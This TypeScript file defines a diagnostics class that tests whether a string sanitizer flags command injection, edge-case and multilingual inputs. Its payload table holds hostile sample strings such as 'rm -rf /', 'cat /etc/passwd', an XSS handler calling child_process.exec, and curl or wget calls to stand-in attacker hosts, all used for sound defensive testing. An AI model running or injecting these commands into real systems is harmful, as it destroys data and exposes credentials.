// SanitizerDiagnostics_Enhanced.ts
// Enhanced diagnostics with all improvements - uses composition instead of inheritance

import { SecurityStringSanitizer } from "../sanitizers/SecurityStringSanitizer.js";
import { SanitizeAs } from "../types.js";

// Import types from original diagnostics
import type { DiagnosticResult, DiagnosticReport, DiagnosticCategory, DiagnosticSeverity } from "./SanitizerDiagnostics.js";

export class SanitizerDiagnostics_Enhanced {
  private sanitizer: SecurityStringSanitizer;
  
  // Command injection payloads for all sanitizeAs types
  private static commandInjectionPayloads: Record<
    SanitizeAs,
    { id: string; description: string; sample: string }[]
  > = {
    html: [
      { id: "xss-command-injection", description: "Command injection via HTML", sample: `<img src=x onerror="eval('require(\"child_process\").exec(\"ls\")')">` }
    ],
    "html-attribute": [
      { id: "xss-attr-command-injection", description: "Command injection via attribute", sample: `onclick="require('child_process').exec('rm -rf /')"` }
    ],
    json: [
      { id: "json-command-injection", description: "Command injection in JSON", sample: `{"cmd": "ls; rm -rf /"}` }
    ],
    url: [
      { id: "url-command-injection", description: "Command injection in URL", sample: `http://example.com/$(ls)` }
    ],
    path: [
      { id: "path-command-injection", description: "Command injection in path", sample: `/tmp/$(whoami)/file` }
    ],
    "path-safe": [
      { id: "path-safe-command-injection", description: "Command injection in safe path", sample: `/safe/$(whoami)/file` }
    ],
    "mongodb-filter": [
      { id: "mongodb-command-injection", description: "Command injection in MongoDB filter", sample: `{"$where": "function() { return require('child_process').execSync('ls') }"}` }
    ],
    "sql-identifier": [
      { id: "sql-command-injection", description: "Command injection in SQL", sample: `users; $(rm -rf /)` }
    ],
    email: [
      { id: "email-command-injection", description: "Command injection in email", sample: `test@example.com; rm -rf /` }
    ],
    password: [
      { id: "password-command-injection", description: "Command injection in password", sample: `p@ss123; cat /etc/passwd` }
    ],
    username: [
      { id: "username-command-injection", description: "Command injection in username", sample: `admin; ls -la` }
    ],
    "plain-text": [
      { id: "plaintext-command-injection", description: "Command injection in plain text", sample: `Hello; echo "hacked"` }
    ],
    filename: [
      { id: "filename-command-injection", description: "Command injection in filename", sample: `file$(ls).txt` }
    ],
    "search-query": [
      { id: "search-command-injection", description: "Command injection in search query", sample: `test | grep password` }
    ],
    phone: [
      { id: "phone-command-injection", description: "Command injection in phone number", sample: `12345; whoami` }
    ],
    "zip-code": [
      { id: "zipcode-command-injection", description: "Command injection in zip code", sample: `12345 | cat /etc/passwd` }
    ],
    "credit-card": [
      { id: "creditcard-command-injection", description: "Command injection in credit card", sample: `4111-1111-1111-1111; rm -rf /` }
    ],
    uuid: [
      { id: "uuid-command-injection", description: "Command injection in UUID", sample: `1234-5678-$(ls)-abcd` }
    ],
    base64: [
      { id: "base64-command-injection", description: "Command injection in base64", sample: `YWJjO2xz` }
    ],
    hex: [
      { id: "hex-command-injection", description: "Command injection in hex", sample: `6162633b6c73` }
    ],
    "ip-address": [
      { id: "ip-command-injection", description: "Command injection in IP address", sample: `127.0.0.1; ping google.com` }
    ],
    "mongodb-id": [
      { id: "mongoid-command-injection", description: "Command injection in MongoDB ID", sample: `507f1f77bcf86cd7994390$(ls)11` }
    ],
    currency: [
      { id: "currency-command-injection", description: "Command injection in currency", sample: `$100; cat /etc/passwd` }
    ],
    percentage: [
      { id: "percentage-command-injection", description: "Command injection in percentage", sample: `50%; rm -rf /` }
    ],
    "color-hex": [
      { id: "colorhex-command-injection", description: "Command injection in color hex", sample: `#FF0000; ls` }
    ],
    "date-iso": [
      { id: "dateiso-command-injection", description: "Command injection in date", sample: `2025-01-01; echo hacked` }
    ],
    "time-iso": [
      { id: "timeiso-command-injection", description: "Command injection in time", sample: `12:00:00 | wget malicious.com` }
    ],
    "datetime-iso": [
      { id: "datetimeiso-command-injection", description: "Command injection in datetime", sample: `2025-01-01T00:00:00Z; curl attacker.com` }
    ]
  };

  // Edge case test payloads
  private static edgeCasePayloads = [
    { input: "", type: "plain-text" as SanitizeAs, description: "Empty string" },
    { input: "\0", type: "plain-text" as SanitizeAs, description: "Null character" },
    { input: "   \t\n  ", type: "plain-text" as SanitizeAs, description: "Only whitespace" },
    { input: "a".repeat(50000), type: "plain-text" as SanitizeAs, description: "Very long text" },
    { input: "<div>" + "a".repeat(10000) + "</div>", type: "html" as SanitizeAs, description: "Very long HTML" },
    { input: "<div>🎉😊你好مرحبا</div>", type: "html" as SanitizeAs, description: "Unicode HTML" },
    { input: "test\0\0\0end", type: "plain-text" as SanitizeAs, description: "Multiple null bytes" },
    { input: "a".repeat(100) + "@example.com", type: "email" as SanitizeAs, description: "Very long email" },
  ];

  // Internationalization test payloads
  private static internationalizationPayloads = [
    { input: "🎉🎊😊🌟✨🎈🎁🎀", type: "plain-text" as SanitizeAs, description: "Emoji and symbols" },
    { input: "مرحبا بالعالم (Hello World)", type: "plain-text" as SanitizeAs, description: "Right-to-left text" },
    { input: "你好こんにちは안녕하세요", type: "plain-text" as SanitizeAs, description: "Chinese/Japanese/Korean" },
    { input: "Привет мир", type: "plain-text" as SanitizeAs, description: "Cyrillic script" },
    { input: "नमस्ते दुनिया", type: "plain-text" as SanitizeAs, description: "Devanagari script" },
    { input: "аррӏе.com", type: "plain-text" as SanitizeAs, description: "Homoglyph attack" },
    { input: '<div dir="rtl">مرحبا</div>', type: "html" as SanitizeAs, description: "RTL HTML" },
    { input: '<p>🎉 Party time! 🎊</p>', type: "html" as SanitizeAs, description: "HTML with emoji" },
    { input: '<p>Hello 你好 مرحبا</p>', type: "html" as SanitizeAs, description: "Mixed script HTML" },
  ];

  constructor(sanitizer: SecurityStringSanitizer) {
    this.sanitizer = sanitizer;
  }

  /**
   * Run enhanced diagnostics including command injection, edge cases, and internationalization tests
   */
  async runAllEnhanced(options?: { deep?: boolean }): Promise<DiagnosticReport> {
    const start = performance.now();
    const results: DiagnosticResult[] = [];

    // Run command injection tests
    const commandInjectionResults = await this.runCommandInjectionTests();
    results.push(...commandInjectionResults);

    // Run edge case tests if deep mode is enabled
    if (options?.deep) {
      const edgeCaseResults = await this.runEdgeCaseTests();
      results.push(...edgeCaseResults);

      const i18nResults = await this.runInternationalizationTests();
      results.push(...i18nResults);
    }

    return this.buildReport(results, performance.now() - start);
  }

  /**
   * Run command injection tests for all sanitizeAs types
   */
  private async runCommandInjectionTests(): Promise<DiagnosticResult[]> {
    const results: DiagnosticResult[] = [];

    for (const [type, payloads] of Object.entries(SanitizerDiagnostics_Enhanced.commandInjectionPayloads)) {
      for (const payload of payloads) {
        const start = performance.now();

        try {
          const result = await this.sanitizer.sanitize(payload.sample, {
            sanitizeAs: type as SanitizeAs,
            mode: "sanitize-for-storage",
          });

          const reacted = result.errors.length > 0 || result.warnings.length > 0;

          results.push({
            id: `security.command-injection.${payload.id}.${type}`,
            category: "security" as DiagnosticCategory,
            severity: reacted ? "info" : "critical" as DiagnosticSeverity,
            message: reacted
              ? `Command injection test passed for '${type}'.`
              : `Command injection test FAILED for '${type}'.`,
            remediation: reacted
              ? undefined
              : `Update validator for '${type}' to detect command injection.`,
            details: {
              payload: payload.sample,
              errors: result.errors,
              warnings: result.warnings,
            },
            sanitizeAs: type as SanitizeAs,
            passed: reacted,
            durationMs: performance.now() - start,
          });
        } catch (error: any) {
          results.push({
            id: `security.command-injection.${payload.id}.${type}`,
            category: "security" as DiagnosticCategory,
            severity: "critical" as DiagnosticSeverity,
            message: `Sanitizer threw an error during command injection test for '${type}'.`,
            remediation: `Fix sanitizer error handling for command injection in '${type}'.`,
            details: { error: error.message },
            sanitizeAs: type as SanitizeAs,
            passed: false,
            durationMs: performance.now() - start,
          });
        }
      }
    }

    return results;
  }

  /**
   * Run edge case tests
   */
  private async runEdgeCaseTests(): Promise<DiagnosticResult[]> {
    const results: DiagnosticResult[] = [];

    for (const edgeCase of SanitizerDiagnostics_Enhanced.edgeCasePayloads) {
      const start = performance.now();

      try {
        const result = await this.sanitizer.sanitize(edgeCase.input, {
          sanitizeAs: edgeCase.type,
          mode: "sanitize-for-storage",
        });

        const passed = result.errors.length === 0;

        results.push({
          id: `edge-case.${edgeCase.type}.${edgeCase.description.replace(/\s+/g, '-').toLowerCase()}`,
          category: "edge-cases" as DiagnosticCategory,
          severity: passed ? "info" : "warning" as DiagnosticSeverity,
          message: passed
            ? `Edge case '${edgeCase.description}' handled correctly for '${edgeCase.type}'.`
            : `Edge case '${edgeCase.description}' caused errors for '${edgeCase.type}'.`,
          remediation: passed
            ? undefined
            : `Improve validator for '${edgeCase.type}' to handle edge cases better.`,
          details: {
            input: edgeCase.input,
            errors: result.errors,
            warnings: result.warnings,
          },
          sanitizeAs: edgeCase.type,
          passed,
          durationMs: performance.now() - start,
        });
      } catch (error: any) {
        results.push({
          id: `edge-case.${edgeCase.type}.${edgeCase.description.replace(/\s+/g, '-').toLowerCase()}`,
          category: "edge-cases" as DiagnosticCategory,
          severity: "error" as DiagnosticSeverity,
          message: `Sanitizer threw an error during edge case test for '${edgeCase.type}'.`,
          remediation: `Fix sanitizer error handling for edge cases in '${edgeCase.type}'.`,
          details: { error: error.message },
          sanitizeAs: edgeCase.type,
          passed: false,
          durationMs: performance.now() - start,
        });
      }
    }

    return results;
  }

  /**
   * Run internationalization tests
   */
  private async runInternationalizationTests(): Promise<DiagnosticResult[]> {
    const results: DiagnosticResult[] = [];

    for (const i18nTest of SanitizerDiagnostics_Enhanced.internationalizationPayloads) {
      const start = performance.now();

      try {
        const result = await this.sanitizer.sanitize(i18nTest.input, {
          sanitizeAs: i18nTest.type,
          mode: "sanitize-for-storage",
        });

        const passed = result.errors.length === 0;

        results.push({
          id: `i18n.${i18nTest.type}.${i18nTest.description.replace(/\s+/g, '-').toLowerCase()}`,
          category: "internationalization" as DiagnosticCategory,
          severity: passed ? "info" : "warning" as DiagnosticSeverity,
          message: passed
            ? `Internationalization test '${i18nTest.description}' passed for '${i18nTest.type}'.`
            : `Internationalization test '${i18nTest.description}' caused errors for '${i18nTest.type}'.`,
          remediation: passed
            ? undefined
            : `Improve validator for '${i18nTest.type}' to handle internationalization better.`,
          details: {
            input: i18nTest.input,
            errors: result.errors,
            warnings: result.warnings,
          },
          sanitizeAs: i18nTest.type,
          passed,
          durationMs: performance.now() - start,
        });
      } catch (error: any) {
        results.push({
          id: `i18n.${i18nTest.type}.${i18nTest.description.replace(/\s+/g, '-').toLowerCase()}`,
          category: "internationalization" as DiagnosticCategory,
          severity: "error" as DiagnosticSeverity,
          message: `Sanitizer threw an error during internationalization test for '${i18nTest.type}'.`,
          remediation: `Fix sanitizer error handling for internationalization in '${i18nTest.type}'.`,
          details: { error: error.message },
          sanitizeAs: i18nTest.type,
          passed: false,
          durationMs: performance.now() - start,
        });
      }
    }

    return results;
  }

  /**
   * Build report from results
   */
  private buildReport(results: DiagnosticResult[], durationMs: number): DiagnosticReport {
    const summary = {
      total: results.length,
      passed: results.filter((r) => r.passed).length,
      warnings: results.filter((r) => r.severity === "warning").length,
      errors: results.filter((r) => r.severity === "error").length,
      critical: results.filter((r) => r.severity === "critical").length,
      durationMs,
    };

    return { summary, results };
  }
}